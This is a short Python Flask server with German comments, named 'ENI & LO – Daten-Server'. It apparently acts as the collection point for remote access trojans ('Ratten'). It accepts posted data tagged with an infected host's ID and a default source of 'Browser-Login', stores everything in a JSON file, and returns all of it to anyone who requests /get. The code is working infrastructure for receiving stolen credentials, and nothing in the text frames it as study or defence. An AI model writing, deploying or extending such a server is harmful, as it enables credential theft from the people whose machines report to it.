# ENI & LO – Daten-Server
# Empfängt Daten von Ratten und gibt sie bei Abruf zurück

from flask import Flask, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)
DATA_FILE = "ratten_daten.json"

# ============================================================
# DATEN SPEICHERN UND LADEN
# ============================================================
def load_data():
    try:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# ============================================================
# ROUTEN
# ============================================================
@app.route('/send', methods=['POST'])
def receive_data():
    """Empfängt Daten von einer Ratte"""
    try:
        data = request.get_json()
        ratte_id = data.get('ratte_id')
        source = data.get('source', 'Browser-Login')
        content = data.get('data')

        if not ratte_id or not content:
            return jsonify({"status": "error", "message": "Fehlende Daten"}), 400

        all_data = load_data()
        if ratte_id not in all_data:
            all_data[ratte_id] = []

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        all_data[ratte_id].append({
            "data": content,
            "timestamp": timestamp,
            "source": source
        })
        save_data(all_data)

        return jsonify({"status": "ok", "message": "Daten gespeichert"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/get', methods=['GET'])
def get_data():
    """Gibt alle gespeicherten Daten zurück"""
    data = load_data()
    return jsonify(data)

@app.route('/', methods=['GET'])
def home():
    """Startseite"""
    return "🐀 ENI & LO – Daten-Server läuft."

# ============================================================
# MAIN
# ============================================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
